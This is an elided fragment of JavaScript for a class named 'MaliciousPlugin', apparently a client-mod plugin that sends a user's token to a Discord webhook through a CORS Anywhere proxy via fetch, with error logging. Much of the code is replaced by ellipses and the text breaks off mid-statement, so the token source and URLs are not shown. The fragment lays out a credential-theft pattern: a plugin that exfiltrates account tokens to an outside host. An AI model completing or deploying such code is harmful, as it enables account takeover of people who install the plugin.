class MaliciousPlugin {
  constructor() {
    ...
    // Send token to Discord webhook via CORS Anywhere proxy
    ...
    fetch(proxyUrl + webhookUrl, {
      ...
      if (response.ok) {
        ...
        console.error("MaliciousPlugin: Failed to send token", response.statusText);
        return response.json().then(err => {
          console.error("MaliciousPlugin: Error details", err);
        });
      }
    }).catch(error => {
